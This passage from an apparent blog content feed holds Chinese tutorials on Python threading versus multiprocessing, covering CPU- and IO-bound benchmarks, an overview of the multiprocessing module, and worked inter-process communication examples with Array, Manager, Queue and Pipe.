class="line">        tcp.close()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> portList:</span><br><span class="line">    t = threading.Thread(target=scanPort,args=(p,))</span><br><span class="line">    scanList.append(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(portList)):</span><br><span class="line">    scanList[i].start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(portList)):</span><br><span class="line">    scanList[i].join()</span><br></pre></td></tr></table></figure>

<h4 id="谁更快"><a href="#谁更快" class="headerlink" title="谁更快"></a>谁更快</h4><p>因为python锁的问题，线程进行锁竞争、切换线程，会消耗资源。所以，大胆猜测一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在CPU密集型任务下，多进程更快，或者说效果更好；而IO密集型，多线程能有效提高效率。</span><br></pre></td></tr></table></figure>

<p>大家看一下下面的代码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"> </span><br><span class="line">max_process = <span class="number">4</span></span><br><span class="line">max_thread = max_process</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(n,n2)</span>:</span></span><br><span class="line">    <span class="comment">#cpu密集型</span></span><br><span class="line">    <span class="keyword">for</span>  i <span class="keyword">in</span> range(<span class="number">0</span>,n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,(int)(n*n*n*n2)):</span><br><span class="line">            t = i*j</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">thread_main</span><span class="params">(n2)</span>:</span></span><br><span class="line">    thread_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,max_thread):</span><br><span class="line">        t = threading.Thread(target=fun,args=(<span class="number">50</span>,n2))</span><br><span class="line">        thread_list.append(t)</span><br><span class="line"> </span><br><span class="line">    start = time.time()</span><br><span class="line">    print(<span class="string">' [+] much thread start'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> thread_list:</span><br><span class="line">        i.start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> thread_list:</span><br><span class="line">        i.join()</span><br><span class="line">    print(<span class="string">' [-] much thread use '</span>,time.time()-start,<span class="string">'s'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_main</span><span class="params">(n2)</span>:</span></span><br><span class="line">    p = multiprocessing.Pool(max_process)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,max_process):</span><br><span class="line">        p.apply_async(func = fun,args=(<span class="number">50</span>,n2))</span><br><span class="line">    start = time.time()</span><br><span class="line">    print(<span class="string">' [+] much process start'</span>)</span><br><span class="line">    p.close()<span class="comment">#关闭进程池</span></span><br><span class="line">    p.join()<span class="comment">#等待所有子进程完毕</span></span><br><span class="line">    print(<span class="string">' [-] much process use '</span>,time.time()-start,<span class="string">'s'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">"[++]When n=50,n2=0.1:"</span>)</span><br><span class="line">    thread_main(<span class="number">0.1</span>)</span><br><span class="line">    process_main(<span class="number">0.1</span>)</span><br><span class="line">    print(<span class="string">"[++]When n=50,n2=1:"</span>)</span><br><span class="line">    thread_main(<span class="number">1</span>)</span><br><span class="line">    process_main(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"[++]When n=50,n2=10:"</span>)</span><br><span class="line">    thread_main(<span class="number">10</span>)</span><br><span class="line">    process_main(<span class="number">10</span>)</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<p><img src="/articles/4efb4de8/2.png" alt></p>
<p>可以看出来，当对cpu使用率越来越高的时候（代码循环越多的时候），差距越来越大。</p>
<p><strong>验证我们猜想(在CPU密集型任务下，多进程更快，或者说效果更好；而IO密集型，多线程能有效提高效率。</strong></p>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>CPU密集型代码(如：各种循环处理、计数等等)，适合用多进程<br>IO密集型代码(如：文件处理、网络爬虫等)，适合用多线程</p>
<h2 id="判断方法"><a href="#判断方法" class="headerlink" title="判断方法"></a>判断方法</h2><p>1，直接看CPU占用率或硬盘IO读写速度<br>2，大致上归纳：计算较多为CPU密集型；时间等待较多(如网络爬虫)为IO密集型。</p>
<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>对于IO密集型任务：</p>
<p>单进程单线程直接执行用时：10.0333秒<br>多线程执行用时：4.0156秒<br>多进程执行用时：5.0182秒<br>说明多线程适合IO密集型任务。</p>
<p>对于计算密集型任务</p>
<p>单进程单线程直接执行用时：10.0273秒<br>多线程执行用时：13.247秒<br>多进程执行用时：6.8377秒</p>
<p><strong>说明多进程适合计算密集型任务</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义全局变量Queue</span></span><br><span class="line">g_queue = multiprocessing.Queue()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_queue</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"init g_queue start"</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> g_queue.empty():</span><br><span class="line">        g_queue.get()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> _index <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        g_queue.put(_index)</span><br><span class="line">    print(<span class="string">"init g_queue end"</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个IO密集型任务：利用time.sleep()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task_io</span><span class="params">(task_id)</span>:</span></span><br><span class="line">    print(<span class="string">"IOTask[%s] start"</span> % task_id)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> g_queue.empty():</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = g_queue.get(block=<span class="literal">True</span>, timeout=<span class="number">1</span>)</span><br><span class="line">            print(<span class="string">"IOTask[%s] get data: %s"</span> % (task_id, data))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> excep:</span><br><span class="line">            print(<span class="string">"IOTask[%s] error: %s"</span> % (task_id, str(excep)))</span><br><span class="line">    print(<span class="string">"IOTask[%s] end"</span> % task_id)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">g_search_list = list(range(<span class="number">10000</span>))</span><br><span class="line"><span class="comment"># 定义一个计算密集型任务：利用一些复杂加减乘除、列表查找等</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task_cpu</span><span class="params">(task_id)</span>:</span></span><br><span class="line">    print(<span class="string">"CPUTask[%s] start"</span> % task_id)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> g_queue.empty():</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">            count += pow(<span class="number">3</span>*<span class="number">2</span>, <span class="number">3</span>*<span class="number">2</span>) <span class="keyword">if</span> i <span class="keyword">in</span> g_search_list <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = g_queue.get(block=<span class="literal">True</span>, timeout=<span class="number">1</span>)</span><br><span class="line">            print(<span class="string">"CPUTask[%s] get data: %s"</span> % (task_id, data))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> excep:</span><br><span class="line">            print(<span class="string">"CPUTask[%s] error: %s"</span> % (task_id, str(excep)))</span><br><span class="line">    print(<span class="string">"CPUTask[%s] end"</span> % task_id)</span><br><span class="line">    <span class="keyword">return</span> task_id</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">"cpu count:"</span>, multiprocessing.cpu_count(), <span class="string">"\n"</span>)</span><br><span class="line">    print(<span class="string">u"========== 直接执行IO密集型任务 =========="</span>)</span><br><span class="line">    init_queue()</span><br><span class="line">    time_0 = time.time()</span><br><span class="line">    task_io(<span class="number">0</span>)</span><br><span class="line">    print(<span class="string">u"结束："</span>, time.time() - time_0, <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"========== 多线程执行IO密集型任务 =========="</span>)</span><br><span class="line">    init_queue()</span><br><span class="line">    time_0 = time.time()</span><br><span class="line">    thread_list = [threading.Thread(target=task_io, args=(i,)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> thread_list:</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> thread_list:</span><br><span class="line">        <span class="keyword">if</span> t.is_alive():</span><br><span class="line">            t.join()</span><br><span class="line">    print(<span class="string">"结束："</span>, time.time() - time_0, <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"========== 多进程执行IO密集型任务 =========="</span>)</span><br><span class="line">    init_queue()</span><br><span class="line">    time_0 = time.time()</span><br><span class="line">    process_list = [multiprocessing.Process(target=task_io, args=(i,)) <span class="keyword">for</span> i <span class="keyword">in</span> range(multiprocessing.cpu_count())]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> process_list:</span><br><span class="line">        p.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> process_list:</span><br><span class="line">        <span class="keyword">if</span> p.is_alive():</span><br><span class="line">            p.join()</span><br><span class="line">    print(<span class="string">"结束："</span>, time.time() - time_0, <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"========== 直接执行CPU密集型任务 =========="</span>)</span><br><span class="line">    init_queue()</span><br><span class="line">    time_0 = time.time()</span><br><span class="line">    task_cpu(<span class="number">0</span>)</span><br><span class="line">    print(<span class="string">"结束："</span>, time.time() - time_0, <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"========== 多线程执行CPU密集型任务 =========="</span>)</span><br><span class="line">    init_queue()</span><br><span class="line">    time_0 = time.time()</span><br><span class="line">    thread_list = [threading.Thread(target=task_cpu, args=(i,)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> thread_list:</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> thread_list:</span><br><span class="line">        <span class="keyword">if</span> t.is_alive():</span><br><span class="line">            t.join()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"结束："</span>, time.time() - time_0, <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"========== 多进程执行cpu密集型任务 =========="</span>)</span><br><span class="line">    init_queue()</span><br><span class="line">    time_0 = time.time()</span><br><span class="line">    process_list = [multiprocessing.Process(target=task_cpu, args=(i,)) <span class="keyword">for</span> i <span class="keyword">in</span> range(multiprocessing.cpu_count())]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> process_list:</span><br><span class="line">        p.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> process_list:</span><br><span class="line">        <span class="keyword">if</span> p.is_alive():</span><br><span class="line">            p.join()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"结束："</span>, time.time() - time_0, <span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>编程积累</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Multiprocessing基础</title>
    <url>/articles/9a80786c.html</url>
    <content><![CDATA[<p>multiprocessing是Python的标准模块，它既可以用来编写多进程，也可以用来编写多线程。如果是多线程的话，用multiprocessing.dummy即可，用法与multiprocessing基本相同，这里主要介绍多进程的用法，欢迎纠错。</p>
<h2 id="Multiprocessing介绍"><a href="#Multiprocessing介绍" class="headerlink" title="Multiprocessing介绍"></a>Multiprocessing介绍</h2><h5 id="为什么要使用python多进程？"><a href="#为什么要使用python多进程？" class="headerlink" title="为什么要使用python多进程？"></a>为什么要使用python<strong>多进程</strong>？</h5><p>因为python使用全局解释器锁(GIL)，他会将进程中的线程序列化，也就是多核cpu实际上并不能达到并行提高速度的目的，而使用多进程则是不受限的，所以实际应用中都是推荐多进程的。<br>如果每个子进程执行需要消耗的时间非常短（执行+1操作等），这不必使用多进程，因为进程的启动关闭也会耗费资源。<br>当然使用多进程往往是用来处理CPU密集型（科学计算）的需求，如果是IO密集型（文件读取，爬虫等）则可以使用多线程去处理。</p>
<a id="more"></a>

<h2 id="multiprocessing常用组件及功能"><a href="#multiprocessing常用组件及功能" class="headerlink" title="multiprocessing常用组件及功能"></a>multiprocessing常用组件及功能</h2><p>创建管理进程模块：</p>
<ul>
<li>Process (用于创建进程模块）</li>
<li>Pool（用于创建管理进程池）</li>
<li>Queue（用于进程通信，资源共享）</li>
<li>Value，Array（用于进程通信，资源共享）</li>
<li>Pipe（用于管道通信）</li>
<li>Manager（用于资源共享）</li>
</ul>
<p>同步子进程模块：</p>
<ul>
<li>Condition</li>
<li>Event</li>
<li>Lock</li>
<li>RLock</li>
<li>Semaphore</li>
</ul>
<h2 id="Multiprocessing进程管理模块"><a href="#Multiprocessing进程管理模块" class="headerlink" title="Multiprocessing进程管理模块"></a>Multiprocessing进程管理模块</h2><p>说明：由于篇幅有限，模块具体用法结束请参考每个模块的具体链接。</p>
<h5 id="Process模块"><a href="#Process模块" class="headerlink" title="Process模块"></a>Process模块</h5><p>Process模块用来创建子进程，是Multiprocessing核心模块，使用方式与Threading类似，可以实现多进程的创建，启动，关闭等操作。</p>
<h5 id="Pool模块"><a href="#Pool模块" class="headerlink" title="Pool模块"></a>Pool模块</h5><p>Pool模块是用来创建管理进程池的，当子进程非常多且需要控制子进程数量时可以使用此模块。</p>
<h5 id="Queue模块"><a href="#Queue模块" class="headerlink" title="Queue模块"></a>Queue模块</h5><p>Queue模块用来控制进程安全，与线程中的Queue用法一样。</p>
<h5 id="Pipe模块"><a href="#Pipe模块" class="headerlink" title="Pipe模块"></a>Pipe模块</h5><p>Pipe模块用来管道操作。</p>
<h5 id="Manager模块"><a href="#Manager模块" class="headerlink" title="Manager模块"></a>Manager模块</h5><p>Manager模块常与Pool模块一起使用，作用是共享资源。</p>
<h4 id="Multiprocessing同步进程模块"><a href="#Multiprocessing同步进程模块" class="headerlink" title="Multiprocessing同步进程模块"></a>Multiprocessing同步进程模块</h4><h5 id="Lock模块"><a href="#Lock模块" class="headerlink" title="Lock模块"></a>Lock模块</h5><p>作用：当多个进程需要访问共享资源的时候，Lock可以用来避免访问的冲突。</p>
<p>具体场景：所有的任务在打印的时候都会向同一个标准输出(stdout)输出。这样输出的字符会混合在一起，无法阅读。使用Lock同步，在一个任务输出完成之后，再允许另一个任务输出，可以避免多个任务同时向终端输出。</p>
<p>代码实现：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Lock  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">l</span><span class="params">(lock, num)</span>:</span>      </span><br><span class="line">	lock.acquire()      </span><br><span class="line">	<span class="keyword">print</span> <span class="string">"Hello Num: %s"</span> % (num)      </span><br><span class="line">	lock.release()  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:      </span><br><span class="line">	lock = Lock()  <span class="comment">#这个一定要定义为全局    </span></span><br><span class="line">	<span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">20</span>):          </span><br><span class="line">		Process(target=l, args=(lock, num)).start()  <span class="comment">#这个类似多线程中的threading，但是进程太多了，控制不了。</span></span><br></pre></td></tr></table></figure>

<h5 id="Semaphore模块"><a href="#Semaphore模块" class="headerlink" title="Semaphore模块"></a>Semaphore模块</h5><p>作用：用来控制对共享资源的访问数量，例如池的最大连接数。</p>
<h5 id="Event模块"><a href="#Event模块" class="headerlink" title="Event模块"></a>Event模块</h5><p>作用：用来实现进程间同步通信。</p>
<h2 id="Multiprocessing-dummy多线程"><a href="#Multiprocessing-dummy多线程" class="headerlink" title="Multiprocessing.dummy多线程"></a>Multiprocessing.dummy多线程</h2><p>Multiprocessing.dummy用法与Multiprocessing用法基本相同，只不过是用来创建多线程。</p>
<h2 id="使用Multiprocessing疑问"><a href="#使用Multiprocessing疑问" class="headerlink" title="使用Multiprocessing疑问"></a>使用Multiprocessing疑问</h2><ul>
<li><em>启动多进程的代码一定要放在</em> if <strong>name</strong>==”<strong>main</strong>“: <em>后面吗？</em></li>
</ul>
<p>　　解答：windows系统下，想要启动一个子进程，必须加上<em>if *</em>name<strong>==”</strong>main*<em>“:</em>，linux则不需要。</p>
<ul>
<li><em>父进程中的全局变量能被子进程共享吗？</em></li>
</ul>
<p>　　解答：不行，因为每个进程享有独立的内存数据，如果想要共享资源，可以使用Manage类，或者Queue等模块。</p>
<ul>
<li><em>子进程能结束其他子进程或父进程吗？如果能，怎么通过子进程去结束所有进程?</em></li>
</ul>
<p>　　解答：此需求可以稍作修改：所有的子进程都是为了完成一件事情，而当某个子进程完成该事情后，父进程就该结束所有子进程，请问该怎么做？此时结束所有子进程的操作可以交给父进程去做，因为子进程想要结束另外的子进程比较难实现。<br>　　那么问题就又变成了父进程什么时候该结束所有进程？<br>　　其中一个思路是<em>获取每个子进程的返回值</em>，一旦有返回True（结束的标记），则立马结束所有进程；<br>　　另外一种思路是<em>使用共享资源</em>，父进程可以一直去判断这个公共资源，一旦子进程将它改变，则结束所有子进程。（推荐使用前者，因为多进程中不推荐使用资源共享）</p>
<ul>
<li><em>子进程中还能再创建子进程吗？</em></li>
</ul>
<p>解答：可以，子进程可以再创建进程，线程中也可以创建进程。</p>
]]></content>
      <categories>
        <category>编程积累</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python之多进程详解</title>
    <url>/articles/a5c1f14c.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>Python中的multiprocess提供了Process类，实现进程相关的功能。但是它基于fork机制，因此不被windows平台支持。想要在windows中运行，必须使用 if <strong>name</strong> == ‘<strong>main</strong>: 的方式)。并且多进程就是开启多个进程，每个进程之间是不会互相通信互相干扰的，适用于密集计算。</p>
<a id="more"></a>

<h2 id="案例一-基础用法"><a href="#案例一-基础用法" class="headerlink" title="案例一 基础用法"></a>案例一 基础用法</h2><p>多进程的使用方法和多线程使用方法基本一样，所以如果你会多线程用法多进程也就懂了，有一点要注意，定义多进程，然后传递参数的时候，如果是有一个参数就是用args=（i，）一定要加上逗号，如果有两个或者以上的参数就不用这样。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import multiprocessing</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&apos;utf-8&apos;)</span><br><span class="line">def fun(i):</span><br><span class="line">    print sys.path</span><br><span class="line">    print sys.version_info</span><br><span class="line">    print sys.platform</span><br><span class="line">    print sys.long_info</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    m = multiprocessing.Process(target=fun,args=(1,))</span><br><span class="line">    m.start()</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&apos;E:\\python27\\python study&apos;, &apos;E:\\python27&apos;, &apos;C:\\windows\\SYSTEM32\\python27.zip&apos;, &apos;F:\\Python27\\DLLs&apos;, &apos;F:\\Python27\\lib&apos;, &apos;F:\\Python27\\lib\\plat-win&apos;, &apos;F:\\Python27\\lib\\lib-tk&apos;, &apos;F:\\Python27&apos;, &apos;F:\\Python27\\lib\\site-packages&apos;, &apos;F:\\Python27\\lib\\site-packages\\certifi-2017.7.27.1-py2.7.egg&apos;, &apos;F:\\Python27\\lib\\site-packages\\idna-2.6-py2.7.egg&apos;, &apos;F:\\Python27\\lib\\site-packages\\pypiwin32-219-py2.7-win-amd64.egg&apos;, &apos;F:\\Python27\\lib\\site-packages\\future-0.16.0-py2.7.egg&apos;, &apos;F:\\Python27\\lib\\site-packages\\dis3-0.1.1-py2.7.egg&apos;, &apos;F:\\Python27\\lib\\site-packages\\macholib-1.8-py2.7.egg&apos;, &apos;F:\\Python27\\lib\\site-packages\\pefile-2017.9.3-py2.7.egg&apos;, &apos;F:\\Python27\\lib\\site-packages\\altgraph-0.14-py2.7.egg&apos;, &apos;F:\\Python27\\lib\\site-packages\\beautifulsoup4-4.6.0-py2.7.egg&apos;, &apos;F:\\Python27\\lib\\site-packages\\chardet-3.0.4-py2.7.egg&apos;]</span><br><span class="line">sys.version_info(major=2, minor=7, micro=14, releaselevel=&apos;final&apos;, serial=0)</span><br><span class="line">win32</span><br><span class="line">sys.long_info(bits_per_digit=30, sizeof_digit=4)</span><br></pre></td></tr></table></figure>

<h2 id="案例二-数据通信"><a href="#案例二-数据通信" class="headerlink" title="案例二 数据通信"></a>案例二 数据通信</h2><p>ipc：就是进程间的通信模式，常用的一半是socke，rpc，pipe和消息队列等。</p>
<p>multiprocessing提供了threading包中没有的IPC(比如Pipe和Queue)，效率上更高。应优先考虑Pipe和Queue，避免使用Lock/Event/Semaphore/Condition等同步方式 (因为它们占据的不是用户进程的资源)。</p>
<h4 id="使用Array共享数据"><a href="#使用Array共享数据" class="headerlink" title="使用Array共享数据"></a>使用Array共享数据</h4><p>对于Array数组类，括号内的“i”表示它内部的元素全部是int类型，而不是指字符“i”，数组内的元素可以预先指定，也可以只指定数组的长度。Array类在实例化的时候必须指定数组的数据类型和数组的大小，类似temp = Array(‘i’, 5)。对于数据类型有下面的对应关系：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;c&apos;: ctypes.c_char, &apos;u&apos;: ctypes.c_wchar,</span><br><span class="line">&apos;b&apos;: ctypes.c_byte, &apos;B&apos;: ctypes.c_ubyte,</span><br><span class="line">&apos;h&apos;: ctypes.c_short, &apos;H&apos;: ctypes.c_ushort,</span><br><span class="line">&apos;i&apos;: ctypes.c_int, &apos;I&apos;: ctypes.c_uint,</span><br><span class="line">&apos;l&apos;: ctypes.c_long, &apos;L&apos;: ctypes.c_ulong,</span><br><span class="line">&apos;f&apos;: ctypes.c_float, &apos;d&apos;: ctypes.c_double</span><br></pre></td></tr></table></figure>

<p>代码实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from multiprocessing import Process</span><br><span class="line">from multiprocessing import Array</span><br><span class="line"></span><br><span class="line">def func(i,temp):</span><br><span class="line">    temp[0] += 100</span><br><span class="line">    print(&quot;进程%s &quot; % i, &apos; 修改数组第一个元素后-----&gt;&apos;, temp[0])</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    temp = Array(&apos;i&apos;, [1, 2, 3, 4])</span><br><span class="line">    for i in range(10):</span><br><span class="line">        p = Process(target=func, args=(i, temp))</span><br><span class="line">        p.start()</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">进程2   修改数组第一个元素后-----&gt; 101</span><br><span class="line">进程4   修改数组第一个元素后-----&gt; 201</span><br><span class="line">进程5   修改数组第一个元素后-----&gt; 301</span><br><span class="line">进程3   修改数组第一个元素后-----&gt; 401</span><br><span class="line">进程1   修改数组第一个元素后-----&gt; 501</span><br><span class="line">进程6   修改数组第一个元素后-----&gt; 601</span><br><span class="line">进程9   修改数组第一个元素后-----&gt; 701</span><br><span class="line">进程8   修改数组第一个元素后-----&gt; 801</span><br><span class="line">进程0   修改数组第一个元素后-----&gt; 901</span><br><span class="line">进程7   修改数组第一个元素后-----&gt; 1001</span><br></pre></td></tr></table></figure>

<h4 id="使用Manager共享数据"><a href="#使用Manager共享数据" class="headerlink" title="使用Manager共享数据"></a>使用Manager共享数据</h4><p>通过Manager类也可以实现进程间数据的共享，主要用于线程池之间通信，Manager()返回的manager对象提供一个服务进程，使得其他进程可以通过代理的方式操作Python对象。manager对象支持 list, dict, Namespace, Lock, RLock, Semaphore, BoundedSemaphore, Condition, Event, Barrier, Queue, Value ,Array等多种格式。</p>
<p>代码实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from multiprocessing import Process</span><br><span class="line">from multiprocessing import Manager</span><br><span class="line"></span><br><span class="line">def func(i, dic):</span><br><span class="line">    dic[&quot;num&quot;] = 100+i</span><br><span class="line">    print(dic.items())</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    dic = Manager().dict()</span><br><span class="line">    for i in range(10):</span><br><span class="line">        p = Process(target=func, args=(i, dic))</span><br><span class="line">        p.start()</span><br><span class="line">        p.join()</span><br></pre></td></tr></table></figure>

<h4 id="使用queues的Queue类共享数据"><a href="#使用queues的Queue类共享数据" class="headerlink" title="使用queues的Queue类共享数据"></a>使用queues的Queue类共享数据</h4><p>multiprocessing是一个包，它内部有一个queues模块，提供了一个Queue队列类，可以实现进程间的数据共享，如下例所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import multiprocessing</span><br><span class="line">from multiprocessing import Process</span><br><span class="line">from multiprocessing import queues</span><br><span class="line"></span><br><span class="line">def func(i, q):</span><br><span class="line">    ret = q.get()</span><br><span class="line">    print(&quot;进程%s从队列里获取了一个%s，然后又向队列里放入了一个%s&quot; % (i, ret, i))</span><br><span class="line">    q.put(i)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    lis = queues.Queue(20, ctx=multiprocessing)</span><br><span class="line">    lis.put(0)</span><br><span class="line">    for i in range(10):</span><br><span class="line">        p = Process(target=func, args=(i, lis,))</span><br><span class="line">        p.start()</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">进程1从队列里获取了一个0，然后又向队列里放入了一个1</span><br><span class="line">进程4从队列里获取了一个1，然后又向队列里放入了一个4</span><br><span class="line">进程2从队列里获取了一个4，然后又向队列里放入了一个2</span><br><span class="line">进程6从队列里获取了一个2，然后又向队列里放入了一个6</span><br><span class="line">进程0从队列里获取了一个6，然后又向队列里放入了一个0</span><br><span class="line">进程5从队列里获取了一个0，然后又向队列里放入了一个5</span><br><span class="line">进程9从队列里获取了一个5，然后又向队列里放入了一个9</span><br><span class="line">进程7从队列里获取了一个9，然后又向队列里放入了一个7</span><br><span class="line">进程3从队列里获取了一个7，然后又向队列里放入了一个3</span><br><span class="line">进程8从队列里获取了一个3，然后又向队列里放入了一个8</span><br></pre></td></tr></table></figure>

<p>例如来跑多进程对一批IP列表进行运算，运算后的结果都存到Queue队列里面，这个就必须使用multiprocessing提供的Queue来实现</p>
<p>关于queue和Queue，在Python库中非常频繁的出现，很容易就搞混淆了。甚至是multiprocessing自己还有一个Queue类(大写的Q)和的Manager类中提供的Queue方法，一样能实现消息队列queues.Queue的功能，导入方式是from multiprocessing import Queue，前者Queue用于多个进程间通信，和queues.Queue()差不多，后者Manager().queue用于进程池之间通信。</p>
<h4 id="使用pipe实现进程间通信"><a href="#使用pipe实现进程间通信" class="headerlink" title="使用pipe实现进程间通信"></a>使用pipe实现进程间通信</h4><p>pipe只能适用于两个进程间通信，queue则没这个限制，他有两个方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">receive_pi = Pipe()</span><br><span class="line"># 定义变量，用来获取数据</span><br><span class="line">send_pi = Pipe()</span><br><span class="line"># 用来发送数据</span><br></pre></td></tr></table></figure>

<p>具体例子如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from multiprocessing import Pipe,Process</span><br><span class="line">import time</span><br><span class="line">def produce(pipe):</span><br><span class="line">    pipe.send(&apos;666&apos;)</span><br><span class="line">    time.sleep(1)</span><br><span class="line">def consumer(pipe):</span><br><span class="line">    print(pipe.recv())</span><br><span class="line">    # 有些类似socket的recv方法</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    send_pi,recv_pi = Pipe()</span><br><span class="line">    my_pro = Process(target=produce,args=(send_pi,))</span><br><span class="line">    my_con = Process(target=consumer,args=(recv_pi,))</span><br><span class="line">    my_pro.start()</span><br><span class="line">    my_con.start()</span><br><span class="line">    my_pro.join()</span><br><span class="line">    my_con.join()</span><br></pre></td></tr></table></figure>

<p>pipe相当于queue的一个子集，只能服务两个进程，pipe的性能高于queue。</p>
